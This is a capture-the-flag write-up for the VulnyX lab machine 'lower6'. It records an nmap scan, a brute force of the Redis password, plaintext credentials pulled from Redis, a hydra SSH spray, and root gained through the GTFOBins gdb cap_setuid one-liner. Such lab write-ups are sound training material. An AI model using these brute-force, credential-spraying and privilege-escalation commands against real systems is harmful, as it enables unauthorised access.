# lower6

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| lower6 | d4t4s3c | low | vulnyx |

**Summary:** lower6 is a low difficulty machine that starts with a Redis key value store exposed on the network. A full port scan reveals only SSH and Redis, so the initial foothold comes entirely from abusing the insecure database service. The Redis instance requires authentication, but an Nmap brute force script quickly recovers the weak password `hellow`. Once authenticated, the attacker lists the keys and finds a set of five username and password pairs stored in plaintext. These leaked credentials are fed into hydra against SSH, and the cross combination yields valid login credentials for the user `killer`. After grabbing the user flag, the attack moves to privilege escalation. A capability scan across the filesystem shows that `/usr/bin/gdb` carries the `cap_setuid` capability, meaning it can set the effective user ID of spawned processes. Following the GTFOBins technique, the Python scripting inside gdb is abused to call `setuid(0)` and then drop into a root shell, completing the machine with the root flag.

---

## Reconnaissance

1. Host discovery is performed against the local subnet, and the target appears at `192.168.100.216`, alongside the gateway and the attacker host.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nmap -sn 192.168.100.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 19:33 +0700
Nmap scan report for CLIENT-DESKTOP (192.168.100.1)
Host is up (0.0031s latency).
Nmap scan report for 192.168.100.2 (192.168.100.2)
Host is up (0.0031s latency).
Nmap scan report for 192.168.100.216 (192.168.100.216)
Host is up (0.0019s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.89 seconds
```

2. A full port and service scan against `192.168.100.216` shows only two open services: OpenSSH on port 22 and a Redis key value store on port 6379. This narrow attack surface points directly at Redis as the entry vector.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nmap -sC -sV -p- -T4 $ip 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 19:34 +0700
Nmap scan report for 192.168.100.216 (192.168.100.216)
Host is up (0.0019s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
6379/tcp open  redis   Redis key-value store
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.77 seconds
```

---

## Initial Access

1. Connecting to the Redis instance with the default no password configuration fails. The server responds with `NOAUTH Authentication required`, confirming that a password has been configured for the service.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ redis-cli -h 192.168.100.216
192.168.100.216:6379> PING
(error) NOAUTH Authentication required.
```

2. Since the password is unknown, the Nmap `redis-brute` script is launched against port 6379. After roughly one hundred seconds it recovers the weak password `hellow`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ nmap -p 6379 --script redis-brute 192.168.100.216
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 19:36 +0700
Stats: 0:01:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 79.21% done; ETC: 19:38 (0:00:19 remaining)
Nmap scan report for 192.168.100.216 (192.168.100.216)
Host is up (0.0030s latency).

PORT     STATE SERVICE
6379/tcp open  redis
| redis-brute: 
|   Accounts: 
|     hellow - Valid credentials
|_  Statistics: Performed 4564 guesses in 109 seconds, average tps: 36.6

Nmap done: 1 IP address (1 host up) scanned in 108.52 seconds
```

3. Authenticating with the recovered password succeeds, as confirmed by the `PONG` response. The server details reveal Redis version 7.0.15 running on a Debian based Linux host.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ redis-cli -h 192.168.100.216 -a hellow --no-auth-warning
192.168.100.216:6379> PING
PONG
192.168.100.216:6379> INFO SERVER
# Server
redis_version:7.0.15
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:3f20e06e76a2b578
redis_mode:standalone
os:Linux 6.1.0-37-amd64 x86_64
arch_bits:64
monotonic_clock:POSIX clock_gettime
multiplexing_api:epoll
atomicvar_api:c11-builtin
gcc_version:12.2.0
process_id:343
process_supervised:systemd
run_id:f3a3314f90ef7d895d0b6f58b29828bc4f4727eb
tcp_port:6379
server_time_usec:1786192769158611
uptime_in_seconds:384
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:7807873
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
io_threads_active:0
```

4. Listing all keys reveals five entries, named `key1` through `key5`. The working directory and database filename are also checked, showing the default Redis setup under `/var/lib/redis` with `dump.rdb` as the persistence file.

```bash
192.168.100.216:6379> KEYS *
1) "key4"
2) "key3"
3) "key2"
4) "key5"
5) "key1"
192.168.100.216:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
192.168.100.216:6379> CONFIG GET dbfilename
1) "dbfilename"
2) "dump.rdb"
```

5. Retrieving the contents of each key reveals a treasure trove of credentials stored in plaintext, each one following a `username:password` format.

```bash
192.168.100.216:6379> GET key1
"killer:K!ll3R123"
192.168.100.216:6379> GET key2
"ghost:Ghost!Hunter42"
192.168.100.216:6379> GET key3
"snake:Pixel_Sn4ke77"
192.168.100.216:6379> GET key4
"wolf:CyberWolf#21"
192.168.100.216:6379> GET key5
"shadow:ShadowMaze@9"
```

6. The five credential pairs are saved into two wordlists, `users.txt` and `pass.txt`, and fed into hydra against the SSH service. The cross product between users and passwords yields a hit: the user `killer` reuses the password of another account, `ShadowMaze@9`.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ vim users.txt  
                                                                           
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ vim pass.txt             
                                                                           
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ hydra -L users.txt -P pass.txt ssh://$ip -t 8 -I
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-08 19:45:53
[DATA] max 8 tasks per 1 server, overall 8 tasks, 25 login tries (l:5/p:5), ~4 tries per task
[DATA] attacking ssh://192.168.100.216:22/
[22][ssh] host: 192.168.100.216   login: killer   password: ShadowMaze@9
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-08 19:46:05
```

7. Logging in over SSH as `killer` provides a shell on the target. The user flag is located in the home directory and read immediately.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/vulnyx]
└─$ ssh killer@$ip
killer@192.168.100.216's password: 
killer@lower6:~$ id;whoami;hostname
uid=1000(killer) gid=1000(killer) grupos=1000(killer)
killer
lower6
killer@lower6:~$ cat user.txt 
[REDACTED]
```

---

## Privilege Escalation

1. A recursive capability scan with `getcap` over the entire filesystem reveals the escalation vector: `/usr/bin/gdb` carries the `cap_setuid` capability. This capability allows the debugger to alter the effective user ID of the processes it starts, which is enough to become root.

```bash
killer@lower6:~$ /usr/sbin/getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/usr/bin/gdb cap_setuid=ep
```

2. Using the classic GTFOBins technique for `gdb`, the Python scripting engine built into the debugger is abused. The command runs Python code that calls `os.setuid(0)` and then executes `/bin/bash` from inside gdb, inheriting the elevated privileges granted by the capability.

```bash
killer@lower6:~$ /usr/bin/gdb -nx -ex 'python import os;os.setuid(0)' -ex '!/bin/bash' -ex quit
GNU gdb (Debian 13.1-3) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
root@lower6:~# id
uid=0(root) gid=1000(killer) grupos=1000(killer)
root@lower6:~# su -
root@lower6:~# id
uid=0(root) gid=0(root) grupos=0(root)
```

3. The resulting shell is uid 0, though the group is still inherited from the `killer` account. A quick `su -` clears the group membership, and the root flag is read to complete the machine.

```bash
root@lower6:~# id;whoami;hostname
uid=0(root) gid=0(root) grupos=0(root)
root
lower6
root@lower6:~# cat root.txt 
[REDACTED]
```

---

## Attack Chain Summary
1. **Reconnaissance**: Nmap host discovery identifies `192.168.100.216` as the target. A full service scan exposes only two ports: OpenSSH on 22 and a Redis key value store on 6379.
2. **Vulnerability Discovery**: The Redis instance is protected by a password, but the Nmap `redis-brute` script recovers the weak password `hellow`. Once authenticated, the database reveals five plaintext `username:password` pairs stored under the keys `key1` through `key5`.
3. **Exploitation**: The leaked credentials are fed into hydra against SSH. A password reuse combination grants valid login credentials for the user `killer`, and the user flag is collected from the home directory.
4. **Internal Enumeration**: A recursive `getcap` scan across the filesystem shows that `/usr/bin/gdb` has the `cap_setuid` capability, enabling it to change the effective user ID of processes it spawns.
5. **Privilege Escalation**: The GTFOBins technique for `gdb` is applied, using its Python scripting to call `setuid(0)` and launch a root shell. A `su -` normalizes the group, and the root flag is read, fully compromising the machine.
